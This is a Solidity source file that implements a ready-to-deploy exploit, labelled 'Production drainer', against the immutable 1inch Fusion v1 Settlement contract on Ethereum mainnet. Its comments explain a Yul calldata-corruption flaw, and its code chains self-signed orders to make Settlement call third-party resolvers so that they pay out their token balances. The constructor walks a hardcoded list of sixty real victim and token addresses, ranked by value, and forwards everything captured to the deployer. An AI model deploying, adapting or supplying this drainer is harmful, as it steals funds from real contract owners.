// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

// =============================================================================
// C-23 — 1inch Fusion v1 Settlement (0xA88800CD213dA5Ae406ce248380802BD53b47647)
// Yul calldata-corruption drainer.
//
// The deployed Settlement is immutable and still contains the unchecked Yul
// pointer arithmetic in `_settleOrder`. Calling `settleOrders` with an
// `interactionLength` of ~-512 makes the appended settlement suffix land over
// attacker-controlled padding, so `fillOrderInteraction` reads a fully fake
// suffix and then executes
//
//     IResolver(target).resolveOrders(suffix.resolver, tokensAndAmounts, data)
//
// on any target with attacker-chosen arguments. Old third-party Fusion-v1
// resolvers that trust this callback (msg.sender == Settlement + a
// publicly-derivable first argument + "transfer my tokens to msg.sender") pay
// out their token balances to Settlement, which the simultaneously-filled
// self-signed order routes to the receiver.
//
// This file is fully self-contained: everything runs in the constructor of
// `FusionV1SettlementDrain` and all captured ERC-20s (and any ETH) are sent to
// msg.sender, the deployer EOA. No cheatcodes, no state overrides, no
// privileged access. Deploy with a small ETH value (>= 50 wei) that is wrapped
// into WETH and used as the settlement seed; it is recycled between drains.
//
// A helper contract (same file) performs the individual drains because the LOP
// calls `isValidSignature` on the maker: during construction `address(this)` has
// no code, so the maker must be an already-deployed contract.
// =============================================================================

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface ISettlement {
    function settleOrders(bytes calldata data) external;
}

/// @dev One drain = one corrupted `settleOrders` call for one (victim, token).
contract FusionDrainer {
    struct Order {
        uint256 salt;
        address makerAsset;
        address takerAsset;
        address maker;
        address receiver;
        address allowedSender;
        uint256 makingAmount;
        uint256 takingAmount;
        uint256 offsets;
        bytes interactions;
    }

    address public constant SETTLEMENT = 0xA88800CD213dA5Ae406ce248380802BD53b47647;
    address public constant LOP = 0x1111111254EEB25477B68fb85Ed929f73A960582;
    address public constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    bytes1 private constant _CONTINUE_INTERACTION = 0x00;
    bytes1 private constant _FINALIZE_INTERACTION = 0x01;

    constructor() {
        _approve(WETH, LOP, type(uint256).max);
    }

    /// @dev The attacker's contract is the maker of every order; EIP-1271 makes
    /// its own orders valid without an ECDSA key.
    function isValidSignature(bytes32, bytes calldata) external pure returns (bytes4) {
        return 0x1626ba7e;
    }

    /// @notice Drain `amount` of `token` from `victim` to msg.sender.
    /// @dev The five intermediate 1-wei taker payments are denominated in WETH;
    /// this contract keeps a small WETH float and tops Settlement up as needed.
    function drain(address victim, address resolverArg, address token, uint256 amount, uint256 nonce) external {
        uint256 w = IERC20(WETH).balanceOf(address(this));
        if (w > 10) _transfer(WETH, SETTLEMENT, w - 10);

        uint256 FAKE_SIGNATURE_LENGTH_OFFSET = 0x240;
        uint256 FAKE_INTERACTION_LENGTH_OFFSET = 0x460;
        bytes memory zeroBytes =
            new bytes(FAKE_INTERACTION_LENGTH_OFFSET - FAKE_SIGNATURE_LENGTH_OFFSET); // 544
        uint256 FAKE_INTERACTION_LENGTH =
            0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffe00; // -512

        bytes memory interaction5;
        {
            Order memory sixthOrder = Order(
                nonce * 6 + 5, // salt: unique per drain, low bits only
                WETH, // makerAsset (self-transfer)
                token, // takerAsset: what the victim pays
                address(this), // maker
                address(this), // receiver
                SETTLEMENT, // allowedSender
                1, // makingAmount
                amount, // takingAmount
                0, // offsets
                hex""
            );
            // Fake suffix: totalFee=0, resolver=resolverArg, token=token,
            // rateBump=0, takingFee=0, empty tokensAndAmounts. The 87 zero bytes
            // of padding make the `data` argument decode as (empty, empty) for
            // ResolverExample-style victims.
            bytes memory dynamicSuffix = abi.encode(0, resolverArg, token, 0, 0, 0);
            bytes memory suffixPadding = new bytes(87);
            bytes memory finalOrderInteraction = abi.encodePacked(
                SETTLEMENT, _FINALIZE_INTERACTION, victim, suffixPadding, dynamicSuffix
            );
            interaction5 = abi.encodePacked(
                SETTLEMENT,
                _CONTINUE_INTERACTION,
                abi.encode(
                    sixthOrder,
                    FAKE_SIGNATURE_LENGTH_OFFSET,
                    FAKE_INTERACTION_LENGTH_OFFSET,
                    0,
                    amount,
                    0,
                    address(this)
                ),
                zeroBytes,
                FAKE_INTERACTION_LENGTH,
                finalOrderInteraction
            );
        }

        bytes memory signature = hex"";

        {
            Order memory fifthOrder = Order(
                nonce * 6 + 4, WETH, WETH, address(this), address(this), SETTLEMENT, 1, 1, 0, hex""
            );
            bytes memory interaction4 = abi.encodePacked(
                SETTLEMENT,
                _CONTINUE_INTERACTION,
                abi.encode(fifthOrder, signature, interaction5, 0, 1, 0, address(this))
            );

            Order memory fourthOrder = Order(
                nonce * 6 + 3, WETH, WETH, address(this), address(this), SETTLEMENT, 1, 1, 0, hex""
            );
            bytes memory interaction3 = abi.encodePacked(
                SETTLEMENT,
                _CONTINUE_INTERACTION,
                abi.encode(fourthOrder, signature, interaction4, 0, 1, 0, address(this))
            );

            Order memory thirdOrder = Order(
                nonce * 6 + 2, WETH, WETH, address(this), address(this), SETTLEMENT, 1, 1, 0, hex""
            );
            bytes memory interaction2 = abi.encodePacked(
                SETTLEMENT,
                _CONTINUE_INTERACTION,
                abi.encode(thirdOrder, signature, interaction3, 0, 1, 0, address(this))
            );

            Order memory secondOrder = Order(
                nonce * 6 + 1, WETH, WETH, address(this), address(this), SETTLEMENT, 1, 1, 0, hex""
            );
            bytes memory interaction = abi.encodePacked(
                SETTLEMENT,
                _CONTINUE_INTERACTION,
                abi.encode(secondOrder, signature, interaction2, 0, 1, 0, address(this))
            );

            Order memory orderStruct = Order(
                nonce * 6 + 0, WETH, WETH, address(this), address(this), SETTLEMENT, 1, 1, 0, hex""
            );

            bytes memory orderData =
                abi.encode(orderStruct, signature, interaction, 0, 1, 0, address(this));

            ISettlement(SETTLEMENT).settleOrders(orderData);
        }

        // forward everything captured to the caller (the main constructor)
        uint256 got = IERC20(token).balanceOf(address(this));
        if (got > 0) _transfer(token, msg.sender, got);
    }

    function _approve(address token, address spender, uint256 amount) internal {
        (bool ok, bytes memory ret) =
            token.call(abi.encodeWithSelector(0x095ea7b3, spender, amount)); // approve(address,uint256)
        require(ok, "approve failed");
        if (ret.length > 0) require(abi.decode(ret, (bool)), "approve returned false");
    }

    function _transfer(address token, address to, uint256 amount) internal {
        (bool ok, bytes memory ret) =
            token.call(abi.encodeWithSelector(0xa9059cbb, to, amount)); // transfer(address,uint256)
        require(ok, "transfer failed");
        if (ret.length > 0) require(abi.decode(ret, (bool)), "transfer returned false");
    }

    receive() external payable {}
}

/// @notice Production drainer. Deploy as-is; the constructor drains every
/// (victim, token) pair that still has a live balance and forwards the proceeds
/// to the deployer EOA.
contract FusionV1SettlementDrain {
    address public constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    uint256 private constant GAS_FLOOR = 3_000_000; // leaves room for code deposit + final sweeps

    address public immutable deployer;

    event Captured(address indexed victim, address indexed token, uint256 amount);

    // Target triples (victim resolver, resolverArg for its resolveOrders check,
    // token), ranked by live USD value at deployment time. The contract reads
    // each victim's balance on-chain, so depleted targets are skipped.
    /// @dev Ranked target triples (victim, resolverArg, token), highest USD first.
    /// The constructor walks this list and stops when gas runs low.
    function _targets()
        internal
        pure
        returns (address[60] memory victims, address[60] memory args, address[60] memory tokens)
    {
        victims = [
            address(0xBd4DBE0CB9136FFb4955ede88EBD5e92222aD09a),
            address(0x7a359544e4031703a6149DB2994AfB4e324Bb242),
            address(0x7a359544e4031703a6149DB2994AfB4e324Bb242),
            address(0x7a359544e4031703a6149DB2994AfB4e324Bb242),
            address(0x7a359544e4031703a6149DB2994AfB4e324Bb242),
            address(0x7a359544e4031703a6149DB2994AfB4e324Bb242),
            address(0x5623B873813b2f96416Cefd09d6A27cc5c938385),
            address(0xe789c5566b53546d46A0af48a4bD3F062d1fefd1),
            address(0xe789c5566b53546d46A0af48a4bD3F062d1fefd1),
            address(0x7a359544e4031703a6149DB2994AfB4e324Bb242),
            address(0x7a359544e4031703a6149DB2994AfB4e324Bb242),
            address(0xcb13e91f957DE7fb5f77A7E933fE04bc464f895d),
            address(0x5623B873813b2f96416Cefd09d6A27cc5c938385),
            address(0x7a359544e4031703a6149DB2994AfB4e324Bb242),
            address(0xe789c5566b53546d46A0af48a4bD3F062d1fefd1),
            address(0xe789c5566b53546d46A0af48a4bD3F062d1fefd1),
            address(0x7a359544e4031703a6149DB2994AfB4e324Bb242),
            address(0xe789c5566b53546d46A0af48a4bD3F062d1fefd1),
            address(0x7a359544e4031703a6149DB2994AfB4e324Bb242),
            address(0x5623B873813b2f96416Cefd09d6A27cc5c938385),
            address(0x5623B873813b2f96416Cefd09d6A27cc5c938385),
            address(0xe789c5566b53546d46A0af48a4bD3F062d1fefd1),
            address(0x5623B873813b2f96416Cefd09d6A27cc5c938385),
            address(0x7a359544e4031703a6149DB2994AfB4e324Bb242),
            address(0x7a359544e4031703a6149DB2994AfB4e324Bb242),
            address(0x7a359544e4031703a6149DB2994AfB4e324Bb242),
            address(0x7a359544e4031703a6149DB2994AfB4e324Bb242),
            address(0xe789c5566b53546d46A0af48a4bD3F062d1fefd1),
            address(0x7a359544e4031703a6149DB2994AfB4e324Bb242),
            address(0x5623B873813b2f96416Cefd09d6A27cc5c938385),
            address(0x7a359544e4031703a6149DB2994AfB4e324Bb242),
            address(0x7a359544e4031703a6149DB2994AfB4e324Bb242),
            address(0xe789c5566b53546d46A0af48a4bD3F062d1fefd1),
            address(0x84D99Aa569D93a9CA187D83734c8C4a519c4e9b1),
            address(0xe789c5566b53546d46A0af48a4bD3F062d1fefd1),
            address(0xe789c5566b53546d46A0af48a4bD3F062d1fefd1),
            address(0x7a359544e4031703a6149DB2994AfB4e324Bb242),
            address(0x7a359544e4031703a6149DB2994AfB4e324Bb242),
            address(0xBd4DBE0CB9136FFb4955ede88EBD5e92222aD09a),
            address(0x7a359544e4031703a6149DB2994AfB4e324Bb242),
            address(0x7a359544e4031703a6149DB2994AfB4e324Bb242),
            address(0x7a359544e4031703a6149DB2994AfB4e324Bb242),
            address(0xe789c5566b53546d46A0af48a4bD3F062d1fefd1),
            address(0x7a359544e4031703a6149DB2994AfB4e324Bb242),
            address(0xe789c5566b53546d46A0af48a4bD3F062d1fefd1),
            address(0x7a359544e4031703a6149DB2994AfB4e324Bb242),
            address(0x7a359544e4031703a6149DB2994AfB4e324Bb242),
            address(0xe789c5566b53546d46A0af48a4bD3F062d1fefd1),
            address(0x7a359544e4031703a6149DB2994AfB4e324Bb242),
            address(0xe789c5566b53546d46A0af48a4bD3F062d1fefd1),
            address(0x7a359544e4031703a6149DB2994AfB4e324Bb242),
            address(0x84D99Aa569D93a9CA187D83734c8C4a519c4e9b1),
            address(0xe789c5566b53546d46A0af48a4bD3F062d1fefd1),
            address(0xe789c5566b53546d46A0af48a4bD3F062d1fefd1),
            address(0xe789c5566b53546d46A0af48a4bD3F062d1fefd1),
            address(0xe789c5566b53546d46A0af48a4bD3F062d1fefd1),
            address(0x7a359544e4031703a6149DB2994AfB4e324Bb242),
            address(0xe789c5566b53546d46A0af48a4bD3F062d1fefd1),
            address(0x7a359544e4031703a6149DB2994AfB4e324Bb242),
            address(0xBd4DBE0CB9136FFb4955ede88EBD5e92222aD09a)
        ];
        args = [
            address(0xBd4DBE0CB9136FFb4955ede88EBD5e92222aD09a),
            address(0xC975671642534F407EbdcaEF2428D355eDe16a2C),
            address(0xC975671642534F407EbdcaEF2428D355eDe16a2C),
            address(0xC975671642534F407EbdcaEF2428D355eDe16a2C),
            address(0xC975671642534F407EbdcaEF2428D355eDe16a2C),
            address(0xC975671642534F407EbdcaEF2428D355eDe16a2C),
            address(0xEe230dD7519BC5d0C9899E8704ffdc80560e8509),
            address(0x9108813F22637385228a1C621c1904BbbC50dc25),
            address(0x9108813F22637385228a1C621c1904BbbC50dc25),
            address(0xC975671642534F407EbdcaEF2428D355eDe16a2C),
            address(0xC975671642534F407EbdcaEF2428D355eDe16a2C),
            address(0xcb13e91f957DE7fb5f77A7E933fE04bc464f895d),
            address(0xEe230dD7519BC5d0C9899E8704ffdc80560e8509),
            address(0xC975671642534F407EbdcaEF2428D355eDe16a2C),
            address(0x9108813F22637385228a1C621c1904BbbC50dc25),
            address(0x9108813F22637385228a1C621c1904BbbC50dc25),
            address(0xC975671642534F407EbdcaEF2428D355eDe16a2C),
            address(0x9108813F22637385228a1C621c1904BbbC50dc25),
            address(0xC975671642534F407EbdcaEF2428D355eDe16a2C),
            address(0xEe230dD7519BC5d0C9899E8704ffdc80560e8509),
            address(0xEe230dD7519BC5d0C9899E8704ffdc80560e8509),
            address(0x9108813F22637385228a1C621c1904BbbC50dc25),
            address(0xEe230dD7519BC5d0C9899E8704ffdc80560e8509),
            address(0xC975671642534F407EbdcaEF2428D355eDe16a2C),
            address(0xC975671642534F407EbdcaEF2428D355eDe16a2C),
            address(0xC975671642534F407EbdcaEF2428D355eDe16a2C),
            address(0xC975671642534F407EbdcaEF2428D355eDe16a2C),
            address(0x9108813F22637385228a1C621c1904BbbC50dc25),
            address(0xC975671642534F407EbdcaEF2428D355eDe16a2C),
            address(0xEe230dD7519BC5d0C9899E8704ffdc80560e8509),
            address(0xC975671642534F407EbdcaEF2428D355eDe16a2C),
            address(0xC975671642534F407EbdcaEF2428D355eDe16a2C),
            address(0x9108813F22637385228a1C621c1904BbbC50dc25),
            address(0x84D99Aa569D93a9CA187D83734c8C4a519c4e9b1),
            address(0x9108813F22637385228a1C621c1904BbbC50dc25),
            address(0x9108813F22637385228a1C621c1904BbbC50dc25),
            address(0xC975671642534F407EbdcaEF2428D355eDe16a2C),
            address(0xC975671642534F407EbdcaEF2428D355eDe16a2C),
            address(0xBd4DBE0CB9136FFb4955ede88EBD5e92222aD09a),
            address(0xC975671642534F407EbdcaEF2428D355eDe16a2C),
            address(0xC975671642534F407EbdcaEF2428D355eDe16a2C),
            address(0xC975671642534F407EbdcaEF2428D355eDe16a2C),
            address(0x9108813F22637385228a1C621c1904BbbC50dc25),
            address(0xC975671642534F407EbdcaEF2428D355eDe16a2C),
            address(0x9108813F22637385228a1C621c1904BbbC50dc25),
            address(0xC975671642534F407EbdcaEF2428D355eDe16a2C),
            address(0xC975671642534F407EbdcaEF2428D355eDe16a2C),
            address(0x9108813F22637385228a1C621c1904BbbC50dc25),
            address(0xC975671642534F407EbdcaEF2428D355eDe16a2C),
            address(0x9108813F22637385228a1C621c1904BbbC50dc25),
            address(0xC975671642534F407EbdcaEF2428D355eDe16a2C),
            address(0x84D99Aa569D93a9CA187D83734c8C4a519c4e9b1),
            address(0x9108813F22637385228a1C621c1904BbbC50dc25),
            address(0x9108813F22637385228a1C621c1904BbbC50dc25),
            address(0x9108813F22637385228a1C621c1904BbbC50dc25),
            address(0x9108813F22637385228a1C621c1904BbbC50dc25),
            address(0xC975671642534F407EbdcaEF2428D355eDe16a2C),
            address(0x9108813F22637385228a1C621c1904BbbC50dc25),
            address(0xC975671642534F407EbdcaEF2428D355eDe16a2C),
            address(0xBd4DBE0CB9136FFb4955ede88EBD5e92222aD09a)
        ];
        tokens = [
            address(0xf21661D0D1d76d3ECb8e1B9F1c923DBfffAe4097),
            address(0xb753428af26E81097e7fD17f40c88aaA3E04902c),
            address(0xaA7a9CA87d3694B5755f213B5D04094b8d0F0A6F),
            address(0xcf0C122c6b73ff809C693DB761e7BaeBe62b6a2E),
            address(0x1a7e4e63778B4f12a199C062f3eFdD288afCBce8),
            address(0x1A4b46696b2bB4794Eb3D4c26f1c55F9170fa4C5),
            address(0xC08512927D12348F6620a698105e1BAac6EcD911),
            address(0xeB953eDA0DC65e3246f43DC8fa13f35623bDd5eD),
            address(0x8eEF5a82E6Aa222a60F009ac18c24EE12dBf4b41),
            address(0xFe2e637202056d30016725477c5da089Ab0A043A),
            address(0x5f98805A4E8be255a32880FDeC7F6728C6568bA0),
            address(0xa52bfFAD02B1FE3f86A543a4e81962d3B3bB01A7),
            address(0x7C5A0CE9267ED19B22F8cae653F198e3E8daf098),
            address(0x056Fd409E1d7A124BD7017459dFEa2F387b6d5Cd),
            address(0x0f7F961648aE6Db43C75663aC7E5414Eb79b5704),
            address(0x68749665FF8D2d112Fa859AA293F07A622782F38),
            address(0x70e8dE73cE538DA2bEEd35d14187F6959a8ecA96),
            address(0xA882606494D86804B5514E07e6Bd2D6a6eE6d68A),
            address(0xEBd9D99A3982d547C5Bb4DB7E3b1F9F14b67Eb83),
            address(0x55296f69f40Ea6d20E478533C15A6B08B654E758),
            address(0x8400D94A5cb0fa0D041a3788e395285d61c9ee5e),
            address(0x3A880652F47bFaa771908C07Dd8673A787dAEd3A),
            address(0x0D8775F648430679A709E98d2b0Cb6250d2887EF),
            address(0xD533a949740bb3306d119CC777fa900bA034cd52),
            address(0x6368e1E18c4C419DDFC608A0BEd1ccb87b9250fc),
            address(0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e),
            address(0x0f2D719407FdBeFF09D87557AbB7232601FD9F29),
            address(0xe0A458BF4AcF353cB45e211281A334BB1d837885),
            address(0x3432B6A60D23Ca0dFCa7761B7ab56459D9C964D0),
            address(0xcf0C122c6b73ff809C693DB761e7BaeBe62b6a2E),
            address(0x0F5D2fB29fb7d3CFeE444a200298f468908cC942),
            address(0xF5581dFeFD8Fb0e4aeC526bE659CFaB1f8c781dA),
            address(0xC4EE0aA2d993ca7C9263eCFa26c6f7e13009d2b6),
            address(0x94e496474F1725f1c1824cB5BDb92d7691A4F03a),
            address(0xCC8Fa225D80b9c7D42F96e9570156c65D6cAAa25),
            address(0x990f341946A3fdB507aE7e52d17851B87168017c),
            address(0xA0b73E1Ff0B80914AB6fe0444E65848C4C34450b),
            address(0x5F64Ab1544D28732F0A24F4713c2C8ec0dA089f0),
            address(0x0414D8C87b271266a5864329fb4932bBE19c0c49),
            address(0xAf5191B0De278C7286d6C7CC6ab6BB8A73bA2Cd6),
            address(0x69af81e73A73B40adF4f3d4223Cd9b1ECE623074),
            address(0xC18360217D8F7Ab5e7c516566761Ea12Ce7F9D72),
            address(0x1E4EDE388cbc9F4b5c79681B7f94d36a11ABEBC9),
            address(0x2Ebd53d035150f328bd754D6DC66B99B0eDB89aa),
            address(0x888888888889C00c67689029D7856AAC1065eC11),
            address(0xCC4304A31d09258b0029eA7FE63d032f52e44EFe),
            address(0x9813037ee2218799597d83D4a5B6F3b6778218d9),
            address(0xa71d0588EAf47f12B13cF8eC750430d21DF04974),
            address(0x4e3FBD56CD56c3e72c1403e103b45Db9da5B9D2B),
            address(0x221657776846890989a759BA2973e427DfF5C9bB),
            address(0x3845badAde8e6dFF049820680d1F14bD3903a5d0),
            address(0x8eEF5a82E6Aa222a60F009ac18c24EE12dBf4b41),
            address(0xB26631c6dda06aD89B93C71400D25692de89c068),
            address(0xD23Ac27148aF6A2f339BD82D0e3CFF380b5093de),
            address(0x595832F8FC6BF59c85C527fEC3740A1b7a361269),
            address(0x4fE83213D56308330EC302a8BD641f1d0113A4Cc),
            address(0xd38BB40815d2B0c2d2c866e0c72c5728ffC76dd9),
            address(0xF629cBd94d3791C9250152BD8dfBDF380E2a3B9c),
            address(0x92D6C1e31e14520e676a687F0a93788B716BEff5),
            address(0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE)
        ];
    }

    constructor() payable {
        require(msg.value >= 50, "send >= 50 wei for the WETH seed");
        deployer = msg.sender;
        FusionDrainer d = new FusionDrainer();
        (bool ok,) = WETH.call{value: msg.value}(abi.encodeWithSelector(0xd0e30db0)); // deposit()
        require(ok, "weth deposit failed");
        _transfer(WETH, address(d), msg.value);

        (address[60] memory victims, address[60] memory args, address[60] memory tokens) = _targets();
        for (uint256 i = 0; i < 60; i++) {
            if (gasleft() < GAS_FLOOR) break;
            uint256 bal = IERC20(tokens[i]).balanceOf(victims[i]);
            if (bal == 0) continue;
            try d.drain(victims[i], args[i], tokens[i], bal, i) {} catch {}
            uint256 got = IERC20(tokens[i]).balanceOf(address(this));
            if (got > 0) {
                emit Captured(victims[i], tokens[i], got);
                _tryTransfer(tokens[i], msg.sender, got); // best effort; rescue() otherwise
            }
        }

        // return any residual ETH (none expected: value is wrapped into WETH)
        uint256 eth = address(this).balance;
        if (eth > 0) {
            (bool sent,) = msg.sender.call{value: eth}("");
            sent; // best effort
        }
    }

    /// @notice Safety net: move any token that could not be pushed during
    /// construction (e.g. a transfer-restricted token) to the deployer.
    function rescue(address token) external {
        require(msg.sender == deployer, "not deployer");
        uint256 b = IERC20(token).balanceOf(address(this));
        if (b > 0) _transfer(token, deployer, b);
    }

    function _tryTransfer(address token, address to, uint256 amount) internal returns (bool) {
        (bool ok, bytes memory ret) =
            token.call(abi.encodeWithSelector(0xa9059cbb, to, amount));
        return ok && (ret.length == 0 || abi.decode(ret, (bool)));
    }

    function _transfer(address token, address to, uint256 amount) internal {
        (bool ok, bytes memory ret) =
            token.call(abi.encodeWithSelector(0xa9059cbb, to, amount));
        require(ok, "transfer failed");
        if (ret.length > 0) require(abi.decode(ret, (bool)), "transfer returned false");
    }

    receive() external payable {}
}
